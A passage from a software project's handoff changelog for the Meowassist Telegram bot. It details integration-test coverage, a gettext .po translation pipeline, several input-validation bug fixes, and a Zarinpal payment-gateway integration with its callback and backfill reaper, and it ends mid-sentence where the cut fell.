* ~~**Add coverage for the FSM flows**~~ ✅ **shipped (Stage-15-Step-E #6 follow-up #1 PR).** Added `tests/integration/test_fsm_flows.py` with five new live-bot tests: `/redeem` → bad-code reject (asserts the FSM exits cleanly and the bot still answers `/start` afterwards), hub-keyboard geometry pin (≥1 row, ≥2 buttons), wallet-button click + `$` balance assertion (the new callback-query path — see next bullet), free-text-on-hub doesn't wedge the FSM, and `/redeem` → `/start` mid-FSM clears the state (regression for the pre-PR-110 `cmd_start` bug that consumed slash commands as raw text inside FSM states). All five gated by the same `integration_secrets` fixture so CI stays green; locally they require `TG_API_ID` / `TG_API_HASH` / `TG_TEST_SESSION_STRING` / `TG_TEST_BOT_USERNAME` to run.
* ~~**Add coverage for the inline keyboard / callback-query path**~~ ✅ **shipped (Stage-15-Step-E #6 follow-up #1 PR).** New `click_button_and_wait(message, *, text=..., index=...)` helper in `tests/integration/conftest.py` taps a button on a previously-received bot message and waits for the bot's reply — handles BOTH the conventional "edit the same message in place" callback-query path (polls `edit_date` until it changes) AND the "post a brand-new message in response" path (polls `iter_messages(min_id=message.id)`). Buttons can be matched by case-insensitive substring (`text="wallet"` matches `"💰 Wallet"`) OR by grid coordinates (`index=(row, col)`) for tests that target geometry rather than i18n labels. Pinned end-to-end by `test_wallet_button_click_renders_wallet_card`.
* ~~**Wire the suite into a separate optional CI job**~~ ✅ **shipped in Stage-15-Step-E #6 follow-up #2 (this PR).** New `.github/workflows/integration.yml` runs the suite on a manual `workflow_dispatch` trigger only — never on push / pull_request, so a fork PR can't kick off a run with no access to the session-string secret. Operator stores the four secrets in repo Settings → Secrets and variables → Actions, then Actions tab → "Integration tests (live Telegram)" → "Run workflow". Job-level 15-minute `timeout-minutes` so a hung Telethon client (stale session, offline bot) can't burn the workflow's full 6-hour budget. `concurrency: cancel-in-progress: true` so a fresh manual trigger cancels stale ones (most likely after a config tweak). Pre-step prints which secrets are present (without their values) so the operator gets explicit signal in the run log if a binding is missing. **Pinned by 9 stdlib-only sanity tests** in `tests/test_workflows.py` — the project has zero runtime YAML dependency, so the tests use regex over the file text instead of pulling in PyYAML. The tests assert: file exists, has a `name`, is `workflow_dispatch`-only (no `push:` / `pull_request:` / `schedule:` / `release:` trigger), has a 1–60-min `timeout-minutes`, binds all four secrets via `${{ secrets.TG_* }}`, declares a concurrency group with `cancel-in-progress: true`, pins Python 3.11/3.12, installs `requirements-dev.txt` (telethon lives there), and the original `ci.yml` still exists.
* **Spin up a dedicated test bot and seed an opinionated test account** — the current docs say "use a separate bot, not production". A follow-up should script `BOT_TOKEN_TEST` provisioning + a fixture user with `$10` of seed credits so refund / debit smoke tests don't need a real top-up.
* ~~**Document the operator's manual test recipe in README.md**~~ ✅ **shipped in Stage-15-Step-E #6 follow-up #2 (this PR, alongside the GH Actions job).** README now documents the **manual smoke recipe**: from a local shell with the four env vars exported, run `pytest tests/integration/ -v` against the test bot. Suite finishes in <5 minutes and prints `PASSED` / `FAILED` per case with full Telegram round-trip output. To regenerate `TG_TEST_SESSION_STRING`, paste the docstring snippet from `tests/integration/conftest.py` into a python REPL with the api_id + api_hash on hand. Backoffice smoke (top up via NowPayments, refund, broadcast) is still operator-driven and not yet scripted; that's a deeper follow-up.

Bundled bug fix in this PR (real, found while reviewing `vision.py` for the upcoming Stage-15-Step-E #10 follow-ups): **`vision.build_multimodal_user_message` now type-checks `prompt` against `str | None` before the `(prompt or "").strip()` call.** Pre-fix, a non-string truthy `prompt` (e.g. a dict from a fuzzed payload, a list mistakenly passed through, or a payload manipulated by a future caller) would slip past the `or ""` short-circuit and crash with `AttributeError: 'dict' object has no attribute 'strip'` instead of the documented `VisionError(reason="invalid_input")` contract. The function's docstring promises every bad input shape produces a clean `VisionError`; the fix closes that gap. 7 new tests in `tests/test_vision.py` cover the type-guard rejection (parametrized over dict / list / int / float / bytes / `object()`) plus a regression pin that `prompt=None` with a non-empty image list still works (the documented "image-only" calling convention).

Stage-15-Step-E #6 follow-up #1 also lands a separate "always-on" unit-test file at `tests/test_integration_conftest_helpers.py` (31 unit tests, runs in CI with no Telegram secrets) that exercises the `_read_int_env` / `_read_float_env` env-var parsers shipped by the integration `conftest.py`. Without this, the integration helpers were untested in CI — they only ran when an operator opted into the full suite locally.

Bundled bug fix in the FSM follow-up PR (real, found while writing the new env-parser unit tests): **`tests/integration/conftest.py::_read_float_env` was rejecting NaN but accepting `+inf` / `-inf`.** Pre-fix the guard was `if not (value >= 0.0)`, which the comment claimed was "NaN safe" — true for NaN (`nan >= 0.0` is False, so `not False = True` → reject) but wrong for `+inf` (`inf >= 0.0` is True, so `not True = False` → pass through unchanged). An operator setting `TG_TEST_SETTLE_SECONDS=inf` or `TG_TEST_TIMEOUT_SECONDS=inf` (a plausible typo for "no timeout") would then deadlock the suite at `await asyncio.sleep(inf)` inside `send_and_wait` instead of falling back to the documented default and logging a WARNING. Fix: replace the `>= 0.0` guard with `math.isfinite(value) or value < 0.0` (with the right negation semantics — `not math.isfinite(value) or value < 0.0`), which catches NaN, `+inf`, and `-inf` in a single check. Pinned by 8 parametrized cases over `nan` / `NaN` / `NAN` / `inf` / `INF` / `Infinity` / `+inf` / `-inf` / `-Infinity`, plus a guardrail that introspects the `integration_timeouts` fixture's hardcoded defaults to ensure no future contributor wires `inf` as a fallback.

Bundled bug fix in this PR (real, found during the env-parsing audit while drafting the integration test setup): **`model_discovery._parse_float_env` and `fx_rates._parse_float_env` now reject `nan` / `inf` / `-inf` env values explicitly, falling back to the supplied default with a logged WARNING.** Pre-fix, the two near-identical helpers caught only `ValueError` from `float(raw)` — but `float("nan")` / `float("inf")` parse *successfully* and return non-finite floats. Both helpers feed into a percent-threshold comparison: `model_discovery._compute_price_deltas` does `if abs(input_delta_pct) >= threshold_pct` and `fx_rates.refresh_usd_to_toman_once` does `if abs(delta_pct) >= threshold`. Every comparison against NaN is `False` in Python, and nothing finite ever exceeds `+Inf`, so a misconfigured `PRICE_ALERT_THRESHOLD_PERCENT=nan` (or `FX_RATE_ALERT_THRESHOLD_PERCENT=inf`) would *silently disable* the alert system on that side: admins would stop being DM'd about price moves and FX swings without any error surfacing in logs. The fallback path was supposed to catch operator typos and warn — instead it accepted the malformed value and pretended everything was fine. Fix: `math.isfinite(value)` guard added to both helpers; non-finite values now log a WARNING and fall back to the supplied default, so the alerts keep working at the documented threshold instead of going dark. 16 new tests across `test_model_discovery.py` (7 unit cases) and `test_fx_rates.py` (8 unit cases + 1 end-to-end pin proving a `nan` env value still fires the rate-move DM via the default-fallback path).

---

##### Stage-15-Step-E #7 — what's shipped vs. what remains (STARTED, not finished)

**Step-E #7 (i18n framework upgrade) — STARTED in PR-after-Step-E-#6.**

Original spec (Step-E table row 7): "move from the current `strings.py` dict to proper `.po` / `.mo` gettext files. Enables community translations, pluralization rules, and tooling like Crowdin."

What's shipped this PR — **the `.po` round-trip foundation**. The runtime keeps reading `strings._STRINGS`; the new `.po` files under `locale/<lang>/LC_MESSAGES/messages.po` are a *derived artifact* that the gettext-tooling ecosystem (Poedit, Crowdin, OmegaT) can consume. This is the smallest invasive change that materially unblocks community translations: a translator can now download `messages.po`, translate in Poedit, and submit a PR with the diffed `.po` instead of editing a 1100-line Python literal. The gettext-at-runtime path (replacing `t()` with `gettext.gettext()` / `ngettext()`) is the next slice.

* `i18n_po.py` — new module ~330 LoC, no third-party deps:
    * `dump_po(lang, *, strings_table=None, default_lang=None, project_id_version, revision_date)` — renders the full `.po` body for a locale. Signature lets tests pass a synthetic dict without coupling round-trip tests to the live 164-key `_STRINGS`.
    * `load_po(text)` — strict + tolerant parser. Tolerant of comment lines (`#`, `#.`, `#:`, `#,`) and blank-line entry separators; strict on unterminated quotes, duplicate `msgid`, orphan continuation lines, and unsupported `msgctxt` (we don't use context disambiguation today; a stray `msgctxt` from a future feature should be loud, not silently ignored).
    * `_escape_po_string` / `_unescape_po_string` — gettext escape rules: backslash, double-quote, newline, tab. UTF-8 passthrough preserves Persian RTL marks / ZWNJ / Arabic-presentation forms verbatim.
    * `_format_po_value` — chooses single-line vs. multi-line `""<NL>"line"` continuation form. Single-line for short ASCII strings (≤76 chars, no newlines); multi-line otherwise. Matches Poedit's wrapping conventions so a round-trip through the tool doesn't reformat the file.
    * `dump_po`'s `revision_date` defaults to the gettext placeholder `YEAR-MO-DA HO:MI+ZONE` so the file is byte-stable across re-exports — a translator's diff stays small even when many slugs are unchanged.
    * `dump_po` raises `ValueError` for unknown locales (not `KeyError`) so a typo in the CLI gets a clean message rather than an opaque traceback.
    * **Format conventions** documented in the module docstring: msgid is the slug (not the source-language string) because Persian-as-msgid is awkward, RTL, and length-explodes; msgstr is the translation in the locale; the default-locale text appears as a `#.` translator comment for context when translating into a non-default locale; no `msgctxt` (single global namespace fits the flat slug naming scheme).
* `python -m i18n_po export` — CLI that writes every supported locale's `.po` file under `locale/<lang>/LC_MESSAGES/messages.po`. Used to regenerate after a `strings.py` edit.
* `python -m i18n_po check` — CLI that exits non-zero if any on-disk `.po` differs from the `_STRINGS` export. Used by CI as a drift gate (test_i18n_po.py invokes the same logic via `i18n_po._check_locale_files`).
* `locale/fa/LC_MESSAGES/messages.po` (847 lines) and `locale/en/LC_MESSAGES/messages.po` (1146 lines) — the actual on-disk artifacts, generated from the current dict and committed.
* 22 round-trip + parser tests + 9 `extract_format_fields` nested-spec tests in `tests/test_i18n_po.py` (full breakdown: round-trip every slug for both locales, multi-line preservation, embedded quotes / backslashes / tabs, empty msgstr, Persian-RTL passthrough, dump determinism, `revision_date` default + override, unknown locale, default-locale comment behaviour, header-entry skip, comment-line tolerance, `msgctxt` rejection, duplicate-msgid rejection, orphan-continuation rejection, unterminated-quote rejection, unknown-escape passthrough, drift gate, on-disk round-trip).
* HANDOFF.md and README.md updated.

What remains (next AI's TODO):

* ~~**Replace runtime lookup with stdlib gettext.**~~ ✅ **shipped (Stage-15-Step-E #7 follow-up #1 PR).** New `i18n_runtime.py` module (~210 LoC, no third-party deps) loads every `locale/<lang>/LC_MESSAGES/messages.po` into an in-memory catalog at boot via `init_translations(locale_dir)`. `strings.t()` consults `i18n_runtime.gettext_lookup(lang, key)` *between* the admin-override cache (still highest priority) and the compiled-default `_STRINGS` table — so a translator can drop an edited `messages.po` into the locale directory and the bot picks up the new strings on the next process restart **without a code deploy**. Empty `msgstr` is treated as a miss (returns `None` so the caller falls through to the compiled default) per the gettext convention for "untranslated". Errors are isolated per-locale: a malformed or missing `.po` file logs an exception but doesn't crash the bot — the affected locale just falls through to its compiled default. Wired into `main.py` boot directly after the `set_overrides` seeding step. Why parse `.po` directly instead of compiling to `.mo` and using `gettext.GNUTranslations`? Zero deploy-time deps (`msgfmt` isn't in stdlib), the parser already exists (`i18n_po.load_po`), loading is one-time at startup so the lookup is a `dict.get` afterwards, and the dict-based catalog gives us a clean "translation missing" signal that `gettext.GNUTranslations.gettext()` doesn't (which conflates "no translation" with "translation == msgid"). 22 new tests pin the runtime layer (lookup semantics, error paths, empty-msgstr handling, default-locale fallback through `.po`, admin-override-wins-over-`.po`, format-kwargs through `.po`, debug snapshot, idempotent re-init, reset).
* **Add ngettext-style pluralization.** Once the gettext path is live, slugs like `receipts_count` ("1 receipt" vs. "N receipts") can move to a `t_plural(lang, key_one, key_other, n, **kwargs)` helper. Persian's plural rules are simpler than English's (one form for every count); the gettext `Plural-Forms` header expresses that. Today the bot has zero pluralized strings — adopting them is a quality lift, not a bug fix, so it's a follow-up rather than blocker.
* ~~**Ship the importer side of the round-trip.**~~ ✅ **shipped (Stage-15-Step-E #7 follow-up #2 PR).** New `python -m i18n_po import <lang> <path>` CLI bulk-loads a translator's `.po` into the runtime `bot_strings` table. Every `msgstr` is validated against `strings.validate_override` before being written; entries that fail (unknown slug, bad placeholder, malformed format syntax) are reported and skipped — the rest are upserted. `--dry-run` validates without writing. `--updated-by NAME` tags the `bot_strings.updated_by` audit column with a translator name or PR number. The CLI prints a five-bucket summary (`upserted` / `unchanged` / `skipped_empty` / `skipped_unknown_slug` / `invalid` / `errors`) and exits non-zero if any `invalid` or `errors` were observed so CI / cron-driven imports can fail fast on bad input. Implementation also exposes `import_po_into_db(db, lang, po_text, *, dry_run, updated_by, existing_overrides)` and `ImportReport` for callers (admin web UI, future operator tooling) that want to drive the importer programmatically without reaching for argparse. Bundled real bug fix: `Database.upsert_string_override` now strips NUL bytes from both `value` and `updated_by` before insertion (Postgres `TEXT` rejects NUL with `invalid byte sequence for encoding "UTF8": 0x00`). Pre-fix, a translator's `.po` containing a stray NUL (some Crowdin export pipelines emit them inside multi-line msgstrs) would crash the upsert mid-batch and bubble up to the importer; the web admin editor had the same crash mode. Defensive strip pattern is consistent with the prior `set_admin_role` NUL-byte handling for the `notes` column. 21 new tests in `tests/test_i18n_po_import.py` covering: happy path / dry-run / empty-msgstr skip / unknown-slug skip / unchanged-bucket idempotence / pre-loaded existing-overrides / `updated_by` plumbing / unsupported-lang rejection / invalid-placeholder bucketing (no abort) / unparseable .po surfaced as single error / per-key DB upsert error reported (no abort) / DB snapshot error aborts cleanly / `ImportReport.render` covers all buckets / `has_failures` only on invalid+errors / `total_seen` sums correctly / CLI `--help` lists every arg / CLI missing args exits non-zero / CLI nonexistent path returns 2 / NUL-byte strip in `value` / NUL-byte strip in `updated_by` / clean-input passthrough.
* ~~**Add a .po-format Crowdin / Poedit walkthrough to README.md.**~~ ✅ **shipped (Stage-15-Step-E #7 follow-up #3 PR).** New top-level "Translating Meowassist (translator workflow)" section in README.md (between "Tests" and "Source map") with: an ASCII flow diagram of how `messages.po` reaches `strings.t()`, an explicit "code-deploy path" vs. "hot-update path" split (the former is "edit `.po` → PR → next release", the latter is the operator running `python -m i18n_po import`), step-by-step recipe for Poedit (download → open → translate → save → PR), step-by-step recipe for Crowdin (organisation invite → upload source → translate in web UI → maintainer pulls back), the operator-side `i18n_po import --dry-run` preview workflow with the `--updated-by` audit-tag convention, the "adding a new language" recipe (edit `SUPPORTED_LANGUAGES` → fill `_STRINGS` → `export` + `check` + tests → PR), and a "common pitfalls" subsection covering the don't-edit-`msgid` rule, file-reformat hazards from non-Poedit editors, empty-`msgstr` semantics, NUL-byte stripping, and the format-spec-kwarg gotcha. The existing one-paragraph i18n bullet at the top of the feature list now anchors to the new section instead of duplicating the content. Bundled real bug fix: **`i18n_po._check_locale_files` now flags orphan `locale/<lang>/LC_MESSAGES/messages.po` files for locales not in `strings.SUPPORTED_LANGUAGES` as drift.** Pre-fix the drift gate only iterated the supported set, so a `.po` file for a locale that had been pruned (or a work-in-progress one whose runtime support was reverted) lingered on disk indefinitely; translators on Crowdin still saw it but `i18n_runtime.init_translations` only loads supported locales, so any edits silently never reached users. Post-fix the gate prints `DRIFT: orphan locale 'xx' at <path> — translator edits to this file never reach users because 'xx' is not in strings.SUPPORTED_LANGUAGES. Either add it to SUPPORTED_LANGUAGES (and re-export with python -m i18n_po export) or remove the <dir>` and bumps the exit code to `1`. Six new tests in `tests/test_i18n_po.py:TestOrphanLocaleDetection` covering: clean-dir-no-drift / orphan-with-po-is-drift / orphan-dir-without-po-is-ignored / loose-files-at-root-are-ignored / orphan-and-per-locale-drift-coexist / repo's actual `locale/` is still clean. The function now accepts an optional `locale_dir` keyword arg defaulting to the module-level `LOCALE_DIR` so tests can stage fixtures without monkey-patching the module constant. CLI behaviour is unchanged (`python -m i18n_po check` still calls into the same logic with the default).
* **Optional: extract pluralization-aware string formatting from `strings.py:t()` into a dedicated `i18n.py` module.** The current `t()` is 80 lines and growing; once gettext + ngettext + pluralization land, splitting will make it easier to reason about. Not required for first slice.

Bundled bug fix in the Step-E #7 follow-up #3 PR (real, found while writing the README translator walkthrough — the documented "PR removes a locale from `SUPPORTED_LANGUAGES`" path is silent in CI today): **`i18n_po._check_locale_files` now flags orphan `locale/<lang>/LC_MESSAGES/messages.po` files for locales not in `strings.SUPPORTED_LANGUAGES`.** Pre-fix, the drift gate iterated only `strings.SUPPORTED_LANGUAGES`; a `.po` file for a locale that had been pruned (or one whose runtime support was reverted but whose committed file wasn't removed in the same PR) would linger on disk indefinitely. Translators on Crowdin still saw the file, but `i18n_runtime.init_translations` only loads supported locales, so any edits silently never reached users — the worst kind of failure mode for a community contributor. Post-fix the gate iterates the on-disk `locale/` directory after the per-supported-locale loop, and any `<lang>/LC_MESSAGES/messages.po` whose `<lang>` isn't in the supported set prints `DRIFT: orphan locale 'xx' at <path> — translator edits to this file never reach users because 'xx' is not in strings.SUPPORTED_LANGUAGES. Either add it to SUPPORTED_LANGUAGES (and re-export with python -m i18n_po export) or remove the <dir> directory.` and bumps the exit code to `1`. The function picked up an optional `locale_dir` keyword arg (defaults to module-level `LOCALE_DIR`) so tests can stage fixtures without monkey-patching the module constant; CLI behaviour is unchanged. 6 new tests in `tests/test_i18n_po.py::TestOrphanLocaleDetection` (clean / orphan-with-po / orphan-dir-without-po / loose-files-at-root / orphan-and-per-locale-drift-coexist / repo's actual `locale/` is still clean).

Bundled bug fix in the Step-E #7 follow-up #1 PR (real, found while writing the new `i18n_runtime` round-trip tests): **`i18n_po.dump_po` now escapes its `project_id_version` and `revision_date` arguments before splicing them into the header literal.** Pre-fix the function pasted those caller-supplied strings raw into the f-string `f"Project-Id-Version: {project_id_version}\\n..."`, which works for plain ASCII inputs (the today-default `"meowassist 1.0"` and the gettext placeholder `"YEAR-MO-DA HO:MI+ZONE"`) but breaks the surrounding `"..."` quoted-string literal as soon as the value contains a `"` (quote), `\` (backslash), `\n` (newline), or `\t` (tab) — all of which are legal characters in real-world `Project-Id-Version` strings (e.g. `meowassist 1.0 "beta"`) and `PO-Revision-Date` strings. A broken header would either make `load_po` raise `unterminated quoted string` on parse OR (worse) silently mis-parse later entries because the quote-balance was off. The drift-gate (`python -m i18n_po check`) would catch the divergence on the next CI run, but only AFTER the broken file had been committed to the repo. Fix: route `project_id_version` and `revision_date` through `_escape_po_string` (the same helper used for every other `msgid` / `msgstr` value) before splicing them into the header. 9 new parametrized test cases in `test_i18n_runtime.py::test_dump_po_escapes_project_id_version` and `::test_dump_po_escapes_revision_date` pin the fix (plain ASCII no-op, embedded quote, embedded backslash, embedded newline, embedded tab, empty/None default-placeholder, ISO date passthrough, end-to-end round-trip with quote in pidversion).

Earlier bundled bug fix (Stage-15-Step-E #7 first slice, kept here for reference): **`strings.extract_format_fields` now descends into the format-spec portion of every placeholder.** Pre-fix, the function iterated `_FORMATTER.parse(template)` and only added the top-level `field_name` to the result set — it ignored the `format_spec` entirely. That meant a nested kwarg like `{amount:.{precision}f}` (Python's standard idiom for "format `amount` with N decimal places where N comes from kwargs") returned `{"amount"}` instead of `{"amount", "precision"}`. The latent regression: `validate_override` does `extra = override_fields - default_fields`, and an admin override with a nested-spec kwarg that *isn't* in the compiled default's placeholder set would have an empty `extra` (because the nested kwarg never made it into `override_fields`). The validator silently accepted the override; `set_overrides` saved it; the next render call did `template.format(**kwargs)` and raised `KeyError: 'precision'` for the missing nested kwarg. The runtime catches the KeyError and falls back to the bare slug — so the operator's override silently never rendered, with no error logged at write time. Fix: recursive `extract_format_fields(format_spec)` call inside the loop. Surrounded by a `try/except ValueError` so a malformed nested spec doesn't poison the outer extraction (the runtime `template.format` will raise the clean error at render time, which gives a more useful traceback than a swallowed inner ValueError). 9 new test cases in `test_i18n_po.py::TestExtractFormatFieldsNestedSpec` pin the fix (simple nested, decimal-precision, double-nested, mixed top-level + nested, indexed-field with nested spec, validator end-to-end rejection of unknown nested kwarg, malformed-nested-with-positional outer recovery, malformed-nested-with-empty-positional outer recovery). All 1549 existing tests still pass.

---

##### Stage-15-Step-E #8 — what's shipped vs. what remains (STARTED, not finished)

**Step-E #8 (Zarinpal payment gateway) — STARTED in PR-after-Step-E-#7.**

Original spec (Step-E table row 8): "add conventional card payment options alongside crypto. Zarinpal for Iranian cards (alternative to TetraPay)." The original line of the table also mentioned Stripe for international card support, but the operator (based in Iran) cannot complete Stripe's KYC, so **Stripe was dropped from the roadmap** (HANDOFF refresh on user direction 2026-05-01) and the row is now Zarinpal-only.

What's shipped this PR — **the Zarinpal v4 first slice**. Zarinpal is the largest Iranian card PSP, and an alternative to the existing TetraPay integration that some merchants prefer for its better OEM coverage and v4 API ergonomics. The slice mirrors the TetraPay shape closely (same money invariant, same ledger helpers, same drop-counter pattern, same defensive verify) but accommodates Zarinpal's materially different settlement-callback delivery model: Zarinpal redirects the user's BROWSER back to our callback URL with `?Authority=…&Status=OK|NOK` query parameters, while TetraPay POSTs a JSON body server-to-server.

* `zarinpal.py` — new module ~640 LoC, no third-party deps beyond what's already imported (aiohttp, aiogram, dataclasses):
    * `_api_base()` reads `ZARINPAL_API_BASE` (default `https://payment.zarinpal.com/pg`), `_merchant_id()` reads `ZARINPAL_MERCHANT_ID`, `_timeout_seconds()` reads `ZARINPAL_REQUEST_TIMEOUT_SECONDS` (default 10s; rejects zero / negative / non-finite the same way the TetraPay timeout does), `_callback_url()` derives `${WEBHOOK_BASE_URL}/zarinpal-callback` lazily so tests can patch envs without re-importing.
    * `usd_to_irr_amount(amount_usd, rate_toman_per_usd)` — same pure rounding helper as TetraPay (Toman → Rial × 10, integer-rial output, NaN / Inf / non-positive rejected). Identical math so a future refactor can collapse them into a shared `money.py`.
    * `ZarinpalOrder` dataclass + `ZarinpalError` exception. `ZarinpalError(code, message, body)` carries the gateway-reported integer code (100-style) and the raw body — same shape as `TetraPayError(status, ...)` but with int code instead of string status to match Zarinpal's wire format.
    * `create_order(*, amount_usd, rate_toman_per_usd, description, user_id, email=None, mobile=None)` — POSTs to `/v4/payment/request.json` with `{merchant_id, amount, currency: "IRR", description, callback_url, metadata}`. Refuses without `ZARINPAL_MERCHANT_ID` or `WEBHOOK_BASE_URL`. Raises `ZarinpalError` on non-100 code, missing authority, non-JSON, non-object body. Returns `ZarinpalOrder(authority, payment_url, amount_irr, locked_rate_toman_per_usd, amount_usd, fee_type, fee)`. The browser-facing `payment_url` is `<api_base>/StartPay/<authority>` — the API base is reused for the StartPay host so a sandbox override flips both ends.
    * `verify_payment(authority, amount_irr)` — POSTs to `/v4/payment/verify.json` with `{merchant_id, authority, amount}`. Treats `code=100` (settled now) AND `code=101` (already verified previously) as success — Zarinpal documents 101 explicitly to make verify safe to call twice. Also requires the same integer rial figure that was sent on `create_order` (Zarinpal compares server-side and rejects mismatches as a defense against a tampered redirect); the helper refuses non-int / non-positive `amount_irr`.
    * `zarinpal_callback(request)` — GET handler (NOT POST) that reads `?Authority=…&Status=OK|NOK` query params. Accepts both `Authority` / `authority` and `Status` / `status` casings (Zarinpal's docs are inconsistent; a misconfigured custom domain or future schema tweak could deliver lowercase). Flow: missing-authority drop → Status≠OK records noop transition + drops with failure HTML → `db.get_pending_invoice_amount_usd` lookup → `db.get_pending_invoice_amount_irr` lookup → AUTHORITATIVE `verify_payment` call → idempotent `db.finalize_payment` → audit-only `record_payment_status_transition(outcome="applied")` AFTER successful finalize → best-effort Telegram credit DM. Returns success / failure HTML pages (not JSON or 5xx) — Zarinpal does NOT retry the user-redirect, so a 5xx just looks broken to the user. The outer guard catches unexpected crashes and returns the failure HTML so a bug in the handler can't render a blank-error page.
    * `get_zarinpal_drop_counters()` — process-local snapshot dict with five reasons: `missing_authority`, `non_success_callback`, `unknown_invoice`, `verify_failed`, `replay`. Same shape as `get_tetrapay_drop_counters` so a future "add Zarinpal panel" pass to `web_admin._collect_ipn_health` can plug straight in.
    * Defense-in-depth invariants pinned by tests: (1) verify is called with the IRR figure read from OUR ledger, not anything in the URL — a malicious user can't override the locked amount via `?Amount=1`; (2) record_payment_status_transition is written ONLY AFTER a successful finalize (pre-finalize would lock a transient verify failure into permanent uncreditability — same correctness invariant TetraPay test-pinned in Step-E #6's predecessor); (3) `finalize_payment` returning `None` (refresh-loop dedupe) shows the success HTML so a second tab doesn't look broken.
* `database.py` — new helper `Database.get_pending_invoice_amount_irr(gateway_invoice_id) -> int | None`. Mirrors `get_pending_invoice_amount_usd` in shape but reads `transactions.amount_crypto_or_rial` and casts to `int` defensively (legacy poisoned rows with non-finite values return None, surfaced as a "refusing to verify" branch in the callback).
* `main.py` — wires `app.router.add_get("/zarinpal-callback", zarinpal_callback)` alongside the existing `/tetrapay-webhook` POST route. `register_rate_limited_webhook_path(app, "/zarinpal-callback")` puts the route into the same per-IP token bucket the existing webhooks use — a refresh-loop on the callback URL can't bypass the bucket.
* `strings.py` — new `zarinpal_credit_notification` slug for fa + en. Mirrors `tetrapay_credit_notification` but mentions "Zarinpal" / "زرین‌پال" so the user's DM identifies the gateway. Persian and English variants both committed; `.po` files regenerated via `python -m i18n_po export` to keep the drift gate green.
* `.env.example` — `ZARINPAL_MERCHANT_ID` (required, blank by default), `ZARINPAL_API_BASE` (commented optional), `ZARINPAL_REQUEST_TIMEOUT_SECONDS` (commented optional). The header comment explains the GET-redirect callback flow and contrasts it with TetraPay's POST webhook.
* 62 new tests in `tests/test_zarinpal.py`. Coverage: `usd_to_irr_amount` (7 tests), config helpers + timeout fallback paths (12 tests), `create_order` happy path + 8 failure modes (9 tests), `verify_payment` happy path with 100 / 101 + 6 failure modes (8 tests), `zarinpal_callback` happy path + 17 edge cases including the defense-in-depth pins (18 tests), bundled bug fix regression tests (8 tests). 1658 total tests pass (1596 → 1658, +62 new, no existing tests modified).
* HANDOFF.md and README.md updated.

What remains (next AI's TODO):

* ~~**Telegram FSM integration.**~~ ✅ **shipped (Stage-15-Step-E #8 follow-up #1 PR).** Added a "💳 پرداخت با زرین‌پال" / "💳 Pay with Zarinpal" button on the Toman-entry currency-picker keyboard next to the existing TetraPay button (rendered conditionally on `not is_gateway_disabled("zarinpal")` — the same admin-toggle hook the TetraPay button already uses, so disabling Zarinpal at runtime hides the button without code changes). The picker layout now packs the card-gateway buttons into a single top row whose width tracks the count of enabled card gateways, so a single-enabled deploy doesn't stretch the lone button across the chat width. Routed `cur_zarinpal` through `process_custom_currency_selection` to a new `_start_zarinpal_invoice` helper that mirrors `_start_tetrapay_invoice` 1:1: clear FSM, validate the locked `toman_rate_at_entry` snapshot, call `zarinpal.create_order` (catches both `ZarinpalError` and transport / timeout exceptions, renders `zarinpal_unreachable` with retry / home buttons), call `Database.create_pending_transaction(gateway="zarinpal", currency_used="IRR", gateway_invoice_id=order.authority, gateway_locked_rate_toman_per_usd=order.locked_rate_toman_per_usd, ...)`, and render `zarinpal_order_text` with the gateway-issued StartPay URL on an `InlineKeyboardBuilder.button(url=...)` "Go to Zarinpal" button. Promo `promo_code` / `promo_bonus_usd` ride through to the PENDING row identically to the TetraPay path so settlement credits the bonus. New strings (5): `zarinpal_button`, `zarinpal_creating_order`, `zarinpal_order_text`, `zarinpal_pay_button`, `zarinpal_unreachable` — both `fa` and `en` defined; `.po` files regenerated via `python -m i18n_po export` to keep the drift gate green. 23 new unit tests in `tests/test_zarinpal_telegram_fsm.py`: keyboard wiring (button presence with all combos of {tetrapay, zarinpal} ∈ enabled / disabled), `process_custom_currency_selection` routing (happy path, gateway-disabled toast, lost-amount toast), `_start_zarinpal_invoice` happy path (asserts `create_pending_transaction` kwargs, asserts the StartPay URL ends up on the keyboard), promo data ride-through, missing-rate path renders `charge_toman_no_rate`, `create_order` exception renders `zarinpal_unreachable`, `create_pending_transaction` returning `False` renders `charge_invoice_error` (and crucially, doesn't hand out a payment URL), bundled-bug-fix gate (parametrized over NaN / Inf / negative / zero / `bool` / accidental-string `toman_rate_at_entry`), and an i18n-coverage check confirming every new slug exists in both languages. Total test suite is now **2017 passing** (was 1994 pre-PR).

  Bundled bug fix in this PR (real, found while writing `_start_zarinpal_invoice` and back-checking the existing `_start_tetrapay_invoice` validation gate): **`_start_tetrapay_invoice`'s `toman_rate_at_entry` validation was too permissive.** Pre-fix the gate was `toman_rate_at_entry is None or not isinstance(toman_rate_at_entry, (int, float))`, which accepted `float('nan')`, `float('inf')`, `-1.0`, `0.0`, and `True` (`bool` is a subclass of `int`, so `isinstance(True, (int, float))` is True). A poisoned FSM `toman_rate_at_entry` would slip past the gate, get coerced via `float(toman_rate_at_entry)` and passed into `tetrapay_create_order(rate_toman_per_usd=...)` → `usd_to_irr_amount` which raises `ValueError` on non-finite / non-positive rates. The handler caught that `ValueError` as a generic `Exception` and rendered `tetrapay_unreachable` — misleading the user into thinking the gateway was down when actually our FSM data was corrupted (correct UX is to send them back to the Toman-entry prompt to re-enter a fresh rate). Fix: tightened the gate in BOTH `_start_tetrapay_invoice` AND the new `_start_zarinpal_invoice` to also reject `bool`, non-finite floats, and non-positive values up-front; the user sees `charge_toman_no_rate` with a retry button to `amt_toman` (the Toman-entry prompt). Pinned by a parametrized test that exercises every poisoned-rate shape.
* ~~**Backfill reaper for browser-close races.**~~ ✅ **shipped (Stage-15-Step-E #8 follow-up #2 PR).** New `zarinpal_backfill.py` module spawns an async task at boot that wakes every `ZARINPAL_BACKFILL_INTERVAL_MIN` minutes (default 5) and verifies any PENDING Zarinpal row in the window `(min_age, max_age)` (default 5 min — 23 h). For each row: `zarinpal.verify_payment(authority, locked_irr)` (gateway authoritative settlement check) → `Database.finalize_payment(authority, locked_usd)` (idempotent — FOR UPDATE + status check guards against double-credit if the user reopens their tab while the reaper is mid-tick) → user DM via the same `zarinpal_credit_notification` string the redirect callback would have sent → audit row marked `actor="zarinpal_backfill"` so forensics can distinguish backfill credits from callback credits. Per-process counters (`rows_examined`, `credited`, `verify_failed`, `transport_error`, `finalize_noop`, `audit_failed`) exposed via `get_zarinpal_backfill_counters()` for ops panels. Heartbeat exposed as `meowassist_zarinpal_backfill_last_run_epoch` via the standard `record_loop_tick` plumbing. Jurisdictional split with the existing expire reaper: backfill owns `(min_age_seconds, max_age_hours * 3600)`; expire owns everything older — the README documents the recommended 1-hour buffer between 